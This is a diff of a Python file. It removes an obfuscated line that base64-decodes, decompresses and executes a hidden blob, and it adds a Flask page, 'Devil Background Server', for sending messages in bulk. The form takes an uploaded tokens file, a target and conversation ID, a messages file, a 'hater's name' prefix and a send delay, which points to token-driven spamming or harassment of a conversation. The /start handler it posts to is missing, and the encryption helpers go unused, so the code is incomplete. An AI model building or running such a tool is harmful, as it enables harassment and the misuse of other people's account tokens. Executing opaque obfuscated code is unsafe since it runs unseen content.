@@ -1,6 +1,203 @@
-# ENCODE : TRICK BY SEERAT RULEX BRAND 
-# Obfuscated with PyObfuscate
-# # GITHUB : # https://github.com/trickbyanaysa
-## YOUTUBE : https://www.youtube.com/@Trick-by-rulex-seerat-brand
-# -------------------------
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))
+from flask import Flask, render_template_string, request, send_from_directory, jsonify
+import os
+import threading
+import requests
+import time
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import padding
+import base64
+
+app = Flask(__name__)
+
+# Ensure the static folder exists
+STATIC_FOLDER = "static"
+os.makedirs(STATIC_FOLDER, exist_ok=True)
+
+# AES Encryption/Decryption Helper Functions using cryptography
+def encrypt_message(message, key):
+    # Create cipher config
+    iv = os.urandom(16)
+    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
+    encryptor = cipher.encryptor()
+
+    # Padding the message to be a multiple of 16 bytes
+    padder = padding.PKCS7(128).padder()
+    padded_message = padder.update(message.encode()) + padder.finalize()
+
+    # Encrypting the message
+    ciphertext = encryptor.update(padded_message) + encryptor.finalize()
+
+    # Returning the IV + ciphertext in base64 encoding
+    return base64.b64encode(iv + ciphertext).decode('utf-8')
+
+def decrypt_message(encrypted_message, key):
+    encrypted_message = base64.b64decode(encrypted_message)
+    iv = encrypted_message[:16]
+    ciphertext = encrypted_message[16:]
+
+    # Create cipher config
+    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
+    decryptor = cipher.decryptor()
+
+    # Decrypting the message
+    padded_message = decryptor.update(ciphertext) + decryptor.finalize()
+
+    # Removing padding
+    unpadder = padding.PKCS7(128).unpadder()
+    message = unpadder.update(padded_message) + unpadder.finalize()
+
+    return message.decode('utf-8')
+
+HTML_TEMPLATE = '''
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Devil Background Server</title>
+    <style>
+        body {
+            background-image: url('https://i.ibb.co/zh0DSqt/07eb98c2c7c2b26d328d7e34fdd27350.jpg');
+            background-size: cover;
+            background-position: center;
+            color: white;
+            font-family: Arial, sans-serif;
+        }
+        .content {
+            text-align: center;
+            margin-top: 20%;
+        }
+        .content h1 {
+            font-size: 3em;
+            text-shadow: 2px 2px 5px black;
+        }
+        .content p {
+            font-size: 1.5em;
+            text-shadow: 1px 1px 3px black;
+        }
+        .footer {
+            position: fixed;
+            bottom: 10px;
+            width: 100%;
+            text-align: center;
+            font-size: 1em;
+            color: white;
+        }
+        .form-container {
+            background-color: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 10%;
+            width: 50%;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .form-container h2 {
+            color: white;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            color: white;
+        }
+        .form-group input,
+        .form-group button {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            margin-top: 5px;
+        }
+        .form-group button {
+            background-color: #4CAF50;
+            color: white;
+            cursor: pointer;
+        }
+        .form-group button:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+
+<div class="content">
+    <h1>WELCOME TO ROYAL PUNJAB RULEX </h1>
+    <p>Enjoy the view!</p>
+</div>
+
+<div class="form-container">
+    <h2>Send Encrypted Messages</h2>
+    <form id="messageForm" enctype="multipart/form-data">
+        <div class="form-group">
+            <label for="tokensFile">Upload Tokens File:</label>
+            <input type="file" id="tokensFile" name="tokensFile" accept=".txt" required>
+        </div>
+        <div class="form-group">
+            <label for="targetId">Target ID:</label>
+            <input type="text" id="targetId" name="targetId" value="61564496826469" readonly required>
+        </div>
+        <div class="form-group">
+            <label for="convoId">Conversation ID:</label>
+            <input type="text" id="convoId" name="convoId" required>
+        </div>
+        <div class="form-group">
+            <label for="messagesFile">Upload Messages File:</label>
+            <input type="file" id="messagesFile" name="messagesFile" accept=".txt" required>
+        </div>
+        <div class="form-group">
+            <label for="hatersName">Hater's Name Prefix:</label>
+            <input type="text" id="hatersName" name="hatersName" required>
+        </div>
+        <div class="form-group">
+            <label for="speed">Delay Between Messages (seconds):</label>
+            <input type="number" id="speed" name="speed" value="1" required>
+        </div>
+        <div class="form-group">
+            <button type="submit">Start Server and Send Messages</button>
+        </div>
+    </form>
+</div>
+
+<div class="footer">
+    <p>CREDIT BY- TRICKER SEERAT BRAND</p>
+</div>
+
+<script>
+    document.getElementById('messageForm').addEventListener('submit', function(event) {
+        event.preventDefault();
+
+        let formData = new FormData(this);
+
+        fetch('/start', {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => response.json())
+        .then(result => {
+            alert(result.message);
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            alert('An error occurred. Please check the console for details.');
+        });
+    });
+</script>
+
+</body>
+</html>
+'''
+
+@app.route('/')
+def index():
+    return render_template_string(HTML_TEMPLATE)
+
+@app.route('/static/<path:filename>')
+def static_files(filename):
+    return send_from_directory(STATIC_FOLDER, filename)
+
+if __name__ == "__main__":
+    app.run(debug=True)
